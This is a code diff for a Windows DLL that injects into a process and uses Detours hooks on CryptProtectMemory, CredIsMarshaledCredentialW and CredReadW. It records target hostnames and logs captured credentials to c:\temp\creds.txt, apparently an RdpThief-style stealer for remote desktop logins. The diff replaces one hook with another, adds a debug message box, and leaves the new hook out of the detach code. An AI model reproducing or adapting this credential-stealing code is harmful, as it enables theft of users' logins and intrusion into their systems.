@@ -25,8 +25,8 @@ VOID WriteCredentials() {
 	TCHAR TempFolder[MAX_PATH];
 	GetEnvironmentVariable(L"TEMP", TempFolder, MAX_PATH);
 	TCHAR Path[MAX_PATH];
-	StringCbPrintf(Path, MAX_PATH, L"%s\\data.bin", TempFolder);
-	HANDLE hFile = CreateFile(Path, FILE_APPEND_DATA,  0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	StringCbPrintf(Path, MAX_PATH, L"c:\\temp\\creds.txt", TempFolder);
+	HANDLE hFile = CreateFileA("c:\\temp\\creds.txt", FILE_APPEND_DATA,  0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	WCHAR  DataBuffer[cbBuffer];
 	memset(DataBuffer, 0x00, cbBuffer);
 	DWORD dwBytesWritten = 0;
@@ -38,15 +38,23 @@ VOID WriteCredentials() {
 }
 
 
-static SECURITY_STATUS(WINAPI * OriginalSspiPrepareForCredRead)(PSEC_WINNT_AUTH_IDENTITY_OPAQUE AuthIdentity, PCWSTR pszTargetName, PULONG pCredmanCredentialType, PCWSTR *ppszCredmanTargetName) = SspiPrepareForCredRead;
+//static SECURITY_STATUS(WINAPI * OriginalSspiPrepareForCredRead)(PSEC_WINNT_AUTH_IDENTITY_OPAQUE AuthIdentity, PCWSTR pszTargetName, PULONG pCredmanCredentialType, PCWSTR *ppszCredmanTargetName) = SspiPrepareForCredRead;
+//
+//SECURITY_STATUS _SspiPrepareForCredRead(PSEC_WINNT_AUTH_IDENTITY_OPAQUE AuthIdentity, PCWSTR pszTargetName, PULONG pCredmanCredentialType, PCWSTR *ppszCredmanTargetName) {
+//
+//	lpServer = pszTargetName;
+//	return OriginalSspiPrepareForCredRead(AuthIdentity, pszTargetName, pCredmanCredentialType, ppszCredmanTargetName);
+//}
 
-SECURITY_STATUS _SspiPrepareForCredRead(PSEC_WINNT_AUTH_IDENTITY_OPAQUE AuthIdentity, PCWSTR pszTargetName, PULONG pCredmanCredentialType, PCWSTR *ppszCredmanTargetName) {
+static BOOL (WINAPI * OriginalCredReadW)(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIALW *Credential) = CredReadW;
 
-	lpServer = pszTargetName;
-	return OriginalSspiPrepareForCredRead(AuthIdentity, pszTargetName, pCredmanCredentialType, ppszCredmanTargetName);
+
+BOOL HookedCredReadW(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIALW *Credential)
+{
+	lpServer = TargetName;
+	MessageBoxW(NULL, TargetName, L"CredReadW Hostname", 0);
+	return OriginalCredReadW(TargetName, Type, Flags, Credential);
 }
-
-
 
 static DPAPI_IMP BOOL(WINAPI * OriginalCryptProtectMemory)(LPVOID pDataIn,DWORD  cbDataIn, DWORD  dwFlags) = CryptProtectMemory;
 
@@ -97,7 +105,8 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  dwReason, LPVOID lpReserved)
 		DetourUpdateThread(GetCurrentThread());
 		DetourAttach(&(PVOID&)OriginalCryptProtectMemory, _CryptProtectMemory);
 		DetourAttach(&(PVOID&)OriginalCredIsMarshaledCredentialW, _CredIsMarshaledCredentialW);
-		DetourAttach(&(PVOID&)OriginalSspiPrepareForCredRead, _SspiPrepareForCredRead);
+		//DetourAttach(&(PVOID&)OriginalSspiPrepareForCredRead, _SspiPrepareForCredRead);
+		DetourAttach(&(PVOID&)OriginalCredReadW, HookedCredReadW);
 
 		DetourTransactionCommit();
 	}
@@ -106,7 +115,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  dwReason, LPVOID lpReserved)
 		DetourUpdateThread(GetCurrentThread());
 		DetourDetach(&(PVOID&)OriginalCryptProtectMemory, _CryptProtectMemory);
 		DetourDetach(&(PVOID&)OriginalCredIsMarshaledCredentialW, _CredIsMarshaledCredentialW);
-		DetourDetach(&(PVOID&)OriginalSspiPrepareForCredRead, _SspiPrepareForCredRead);
+		//DetourDetach(&(PVOID&)OriginalSspiPrepareForCredRead, _SspiPrepareForCredRead);
 		DetourTransactionCommit();
 
 	}
